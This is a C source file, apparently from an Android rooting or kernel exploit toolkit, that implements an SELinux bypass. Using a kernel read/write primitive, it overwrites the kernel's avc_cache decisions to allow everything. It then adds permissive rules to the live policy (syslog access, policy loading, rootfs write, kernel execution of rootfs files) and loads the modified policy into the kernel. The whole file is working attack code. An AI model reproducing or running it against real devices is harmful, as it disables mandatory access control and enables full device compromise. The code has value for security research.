#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>

#include <sepol/policydb/policydb.h>
#include <sepol/policydb/services.h>

#include "kallsyms.h"
#include "kernel_rw.h"
#include "kernel_defs.h"
#include "selinux_bypass.h"

static int32_t overwrite_avc_cache(uint64_t pAvcCache)
{
    int32_t iRet = -1;
    uint64_t pAvcCacheSlot = 0;
    uint64_t pAvcDescision = 0;

    for(int32_t i = 0; i < AVC_CACHE_SLOTS; i++)
    {
        pAvcCacheSlot = kernel_read_ulong(pAvcCache + i*sizeof(uint64_t));
        
        while(0 != pAvcCacheSlot)
        {
            pAvcDescision = pAvcCacheSlot - DECISION_AVC_CACHE_OFFSET;

            if(sizeof(uint32_t) != kernel_write_uint(pAvcDescision, AVC_DECISION_ALLOWALL))
            {
                printf("[-] failed to overwrite avc_cache decision!\n");
                goto done;
            }

            pAvcCacheSlot = kernel_read_ulong(pAvcCacheSlot);
        }
    }

    iRet = 0;

done:

    return iRet;
}

static int32_t load_sepolicy_file(uint64_t pAvcCache, char* pszSepolicyPath, struct policy_file* pPolicyFile, policydb_t* pPolicyDb)
{
    int32_t iRet = -1;
    char* pszPolicyFile = NULL;
    int32_t iPolFd = -1;
    struct stat statbuff = {0};
    void* pPolicyMap = MAP_FAILED;

    if(NULL == pszSepolicyPath)
    {
        pszPolicyFile = "/sys/fs/selinux/policy";
    }

    else
    {
        pszPolicyFile = pszSepolicyPath;
    }

    iPolFd = open(pszPolicyFile,  O_RDONLY);

    if(0 > iPolFd)
    {
        if(0 != overwrite_avc_cache(pAvcCache))
        {
            printf("[-] failed to overwrite the avc cache!\n");
            goto done;
        }

        iPolFd = open(pszPolicyFile, O_RDONLY);

        if(0 > iPolFd)
        {
            printf("[-] failed to open sepolicy file!\n");
            goto done;
        }
    }

    if(0 != fstat(iPolFd, &statbuff))
    {
        memset(&statbuff, 0, sizeof(struct stat));

        if(0 != overwrite_avc_cache(pAvcCache))
        {
            printf("[-] failed to overwrite the avc cache!\n");
            goto done;
        }

        if(0 != fstat(iPolFd, &statbuff))
        {
            printf("[-] failed to stat specified sepolicy file!\n");
            goto done;
        }
    }

    pPolicyMap = mmap(NULL, statbuff.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, iPolFd, 0);

    if(MAP_FAILED == pPolicyMap)
    {
        if(0 != overwrite_avc_cache(pAvcCache))
        {
            printf("[-] failed to overwrite the avc cache!\n");
            goto done;
        }

        pPolicyMap = mmap(NULL, statbuff.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, iPolFd, 0);

        if(MAP_FAILED == pPolicyMap)
        {
            printf("[-] failed to map sepolicy file!\n");
            goto done;
        }
    }

    pPolicyFile->type = PF_USE_MEMORY;
    pPolicyFile->data = pPolicyMap;
    pPolicyFile->len = statbuff.st_size;

    if(0 != policydb_init(pPolicyDb))
    {
        printf("[-] failed to initialize policydb!\n");
        goto done;
    }

    if(0 != policydb_read(pPolicyDb, pPolicyFile, SEPOL_NOT_VERBOSE))
    {
        printf("[-] failed to parse sepolicy! invalid sepolicy file?\n");
        goto done;
    }

    iRet = 0;

done:

    if(MAP_FAILED != pPolicyMap)
    {
        munmap(pPolicyMap, statbuff.st_size);
        pPolicyMap = MAP_FAILED;
    }

    if(0 <= iPolFd)
    {
        close(iPolFd);
        iPolFd = -1;
    }

    return iRet;
}

static int32_t get_current_selinux_context(uint64_t pAvcCache, char* pszSeCxtBuff)
{
    int32_t iRet = -1;
    int32_t iSeCxtFd = -1;
    char szSeCxtFileBuff[MAX_SELINUX_CXT_LEN] = {0};
    char szSeCxtTokenBuff[MAX_SELINUX_CXT_LEN] = {0};
    char* pszSeCxtToken = NULL;

    iSeCxtFd = open("/proc/self/attr/current", O_RDONLY);

    if(0 > iSeCxtFd)
    {
        if(0 != overwrite_avc_cache(pAvcCache))
        {
            printf("[-] failed to overwrite the avc cache!\n");
            goto done;
        }

        iSeCxtFd = open("/proc/self/attr/current", O_RDONLY);

        if(0 > iSeCxtFd)
        {
            printf("[-] failed to open current selinux context!\n");
            goto done;
        }
    }

    if(0 >= read(iSeCxtFd, szSeCxtFileBuff, MAX_SELINUX_CXT_LEN))
    {
        if(0 != overwrite_avc_cache(pAvcCache))
        {
            printf("[-] failed to overwrite the avc cache!\n");
            goto done;
        }

        if(0 >= read(iSeCxtFd, szSeCxtFileBuff, MAX_SELINUX_CXT_LEN))
        {
            printf("[-] failed to read current selinux context!\n");
            goto done;
        }
    }

    strcpy(szSeCxtTokenBuff, szSeCxtFileBuff);
    pszSeCxtToken = strtok(szSeCxtTokenBuff, ":");

    for(int32_t i = 0; i < 2; i++)
    {
        if(NULL == pszSeCxtToken)
        {
            printf("[-] current selinux context has unexpected format!\n");
            goto done;
        }

        pszSeCxtToken = strtok(NULL, ":");
    }

    strcpy(pszSeCxtBuff, pszSeCxtToken);

    iRet = 0;

done:
    
    if(0 <= iSeCxtFd)
    {
        close(iSeCxtFd);
        iSeCxtFd = -1;
    }
    
    return iRet;
}

static int32_t add_a_rule_to_sepolicy(char* pszSourceCxt, char* pszTargetCxt, char* pszClassCxt, char* pszPerm, policydb_t* pPolicyDb)
{
    int32_t iRet = -1;
    type_datum_t* pSourceType = NULL;
    type_datum_t* pTargetType = NULL;
    class_datum_t* pClassType = NULL;
    perm_datum_t* pPermType = NULL;
    uint32_t uiPermVal = 0;
    avtab_key_t avtab_key = {0};
    avtab_datum_t* pAvType = NULL;

    pSourceType = (type_datum_t*)hashtab_search(pPolicyDb->p_types.table, pszSourceCxt);

    if(NULL == pSourceType)
    {
        printf("[-] failed to find source context in sepolicy database!\n");
        goto done;
    }

    pTargetType = (type_datum_t*)hashtab_search(pPolicyDb->p_types.table, pszTargetCxt);

    if(NULL == pTargetType)
    {
        printf("[-] failed to find target context in sepolicy database!\n");
        goto done;
    }

    pClassType = (class_datum_t*)hashtab_search(pPolicyDb->p_classes.table, pszClassCxt);

    if(NULL == pClassType)
    {
        printf("[-] failed to find class type in sepolicy database!\n");
        goto done;
    }

    pPermType = (perm_datum_t*)hashtab_search(pClassType->permissions.table, pszPerm);

    if(NULL == pPermType)
    {
        if(NULL == pClassType->comdatum)
        {
            printf("[-] failed to find permission type in sepolicy database!\n");
            goto done;
        }

        pPermType = (perm_datum_t*)hashtab_search(pClassType->comdatum->permissions.table, pszPerm);

        if(NULL == pPermType)
        {
            printf("[-] failed to find permission type in sepolicy database!\n");
            goto done;
        }
    }

    uiPermVal |= 1U << (pPermType->s.value - 1);

    avtab_key.source_type = pSourceType->s.value;
    avtab_key.target_type = pTargetType->s.value;
    avtab_key.target_class = pClassType->s.value;
    avtab_key.specified = AVTAB_ALLOWED;

    pAvType = avtab_search(&pPolicyDb->te_avtab, &avtab_key);

    if(NULL == pAvType)
    {
        pAvType = (avtab_datum_t*)malloc(sizeof(avtab_datum_t));

        if(NULL == pAvType)
        {
            printf("[-] failed to allocate memory!\n");
            goto done;
        }

        memset(pAvType, 0, sizeof(avtab_datum_t));
        pAvType->data = uiPermVal;

        if(0 != avtab_insert(&pPolicyDb->te_avtab, &avtab_key, pAvType))
        {
            printf("[-] failed to insert new permission into sepolicy database!\n");
            goto done;
        }
    }

    pAvType->data |= uiPermVal;

    iRet = 0;

done:

    if((0 != iRet) && (NULL != pAvType))
    {
        free(pAvType);
        pAvType = NULL;
    }

    return iRet;
}

// These are just a few rules I used for testing. I added the permissions needed to load a new SEPolicy 
// so you can add more permissions with a tool like sepolicy-inject, if you find you need them later. 

static int32_t add_rules_to_sepolicy(uint64_t pAvcCache, policydb_t* pPolicyDb)
{
    int32_t iRet = -1;
    char szSeCxtBuff[MAX_SELINUX_CXT_LEN] = {0};

    if(0 != get_current_selinux_context(pAvcCache, szSeCxtBuff))
    {
        printf("[-] failed to get current selinux context!\n");
        goto done;
    }

    printf("[!] current selinux context: %s\n", szSeCxtBuff);

    // allow dmesg

    if(0 != add_a_rule_to_sepolicy(szSeCxtBuff, "kmsg_device", "chr_file", "open", pPolicyDb))
    {
        printf("[-] failed to add rule to sepolicy!\n");
        goto done;
    }

    if(0 != add_a_rule_to_sepolicy(szSeCxtBuff, "kmsg_device", "chr_file", "read", pPolicyDb))
    {
        printf("[-] failed to add rule to sepolicy!\n");
        goto done;
    }

    if(0 != add_a_rule_to_sepolicy(szSeCxtBuff, "kernel", "system", "syslog_read", pPolicyDb))
    {
        printf("[-] failed to add rule to sepolicy!\n");
        goto done;
    }

    // allow access to /proc/kmsg

    if(0 != add_a_rule_to_sepolicy(szSeCxtBuff, "kernel", "system", "syslog_mod", pPolicyDb))
    {
        printf("[-] failed to add rule to sepolicy!\n");
        goto done;
    }

    // allow sepolicy loading

    if(0 != add_a_rule_to_sepolicy(szSeCxtBuff, "kernel", "security", "read_policy", pPolicyDb))
    {
        printf("[-] failed to add rule to sepolicy!\n");
        goto done;
    }

    if(0 != add_a_rule_to_sepolicy(szSeCxtBuff, "kernel", "security", "load_policy", pPolicyDb))
    {
        printf("[-] failed to add rule to sepolicy!\n");
        goto done;
    }

    // allow remount and write to rootfs

    if(0 != add_a_rule_to_sepolicy(szSeCxtBuff, "rootfs", "filesystem", "remount", pPolicyDb))
    {
        printf("[-] failed to add rule to sepolicy!\n");
        goto done;
    }

    if(0 != add_a_rule_to_sepolicy(szSeCxtBuff, "rootfs", "dir", "write", pPolicyDb))
    {
        printf("[-] failed to add rule to sepolicy!\n");
        goto done;
    }

    if(0 != add_a_rule_to_sepolicy(szSeCxtBuff, "rootfs", "dir", "add_name", pPolicyDb))
    {
        printf("[-] failed to add rule to sepolicy!\n");
        goto done;
    }

    if(0 != add_a_rule_to_sepolicy(szSeCxtBuff, "rootfs", "file", "create", pPolicyDb))
    {
        printf("[-] failed to add rule to sepolicy!\n");
        goto done;
    }

    if(0 != add_a_rule_to_sepolicy(szSeCxtBuff, "rootfs", "file", "open", pPolicyDb))
    {
        printf("[-] failed to add rule to sepolicy!\n");
        goto done;
    }

    if(0 != add_a_rule_to_sepolicy(szSeCxtBuff, "rootfs", "file", "read", pPolicyDb))
    {
        printf("[-] failed to add rule to sepolicy!\n");
        goto done;
    }

    if(0 != add_a_rule_to_sepolicy(szSeCxtBuff, "rootfs", "file", "write", pPolicyDb))
    {
        printf("[-] failed to add rule to sepolicy!\n");
        goto done;
    }

    // allow kernel to execute rootfs file

    if(0 != add_a_rule_to_sepolicy("kernel", "rootfs", "file", "execute", pPolicyDb))
    {
        printf("[-] failed to add rule to sepolicy!\n");
        goto done;
    }

    if(0 != add_a_rule_to_sepolicy("kernel", "rootfs", "file", "execute_no_trans", pPolicyDb))
    {
        printf("[-] failed to add rule to sepolicy!\n");
        goto done;
    }

    iRet = 0;

done:
    return iRet;
}

static int32_t inject_sepolicy(uint64_t pAvcCache, policydb_t* pPolicyDb)
{
    int32_t iRet = -1;
    void* pSepolicyBinaryData = NULL;
    size_t sLen = 0;
    int32_t iPolFd = -1;

    if(0 != policydb_to_image(NULL, pPolicyDb, &pSepolicyBinaryData, &sLen))
    {
        printf("[-] failed to convert sepolicy database to binary data!\n");
        goto done;
    }

    iPolFd = open("/sys/fs/selinux/load", O_RDWR);

    if(0 > iPolFd)
    {
        if(0 != overwrite_avc_cache(pAvcCache))
        {
            printf("[-] failed to overwrite the avc cache!\n");
            goto done;
        }

        if(0 > iPolFd)
        {
            printf("[-] failed to open sepolicy load file!\n");
            goto done;
        }
    }

    if(sLen != write(iPolFd, pSepolicyBinaryData, sLen))
    {
        if(0 != overwrite_avc_cache(pAvcCache))
        {
            printf("[-] failed to overwrite the avc cache!\n");
            goto done;
        }

        if(sLen != write(iPolFd, pSepolicyBinaryData, sLen))
        {
            printf("[-] failed to write to sepolicy load file!\n");
            goto done;
        }
    }

    iRet = 0;

done:

    if(0 <= iPolFd)
    {
        close(iPolFd);
        iPolFd = -1;
    }

    return iRet;
}

int32_t do_selinux_bypass(char* pszSepolicyPath)
{
    int32_t iRet = -1;
    uint64_t pAvcCache = 0;
    policydb_t policydb = {0};
    sidtab_t sidtab = {0};
    struct policy_file policyfile = {0};

    pAvcCache = get_kernel_sym_addr("avc_cache");

    if(!IS_KERNEL_POINTER(pAvcCache))
    {
        printf("[-] failed to get address of avc_cache!\n");
        goto done;
    }

    printf("[+] found avc_cache ptr: %lx\n", pAvcCache);

    sepol_set_policydb(&policydb);
    sepol_set_sidtab(&sidtab);
     
    if(0 != load_sepolicy_file(pAvcCache, pszSepolicyPath, &policyfile, &policydb))
    {
        printf("[-] failed to load sepolicy!\n");
        goto done;
    }

    if(NULL == pszSepolicyPath)
    {
        printf("[!] no sepolicy file specified!\n");
        printf("[!] inserting default rules into current sepolicy...\n");

        if(0 != add_rules_to_sepolicy(pAvcCache, &policydb))
        {
            printf("[-] failed to insert rules into current sepolicy!\n");
            goto done;
        }
    }

    printf("[!] attempting to inject new sepolicy into kernel...\n");

    if(0 != inject_sepolicy(pAvcCache, &policydb))
    {
        printf("[-] failed to inject sepolicy!\n");
        goto done;
    }

    iRet = 0;

done:

    policydb_destroy(&policydb);
    return iRet;
}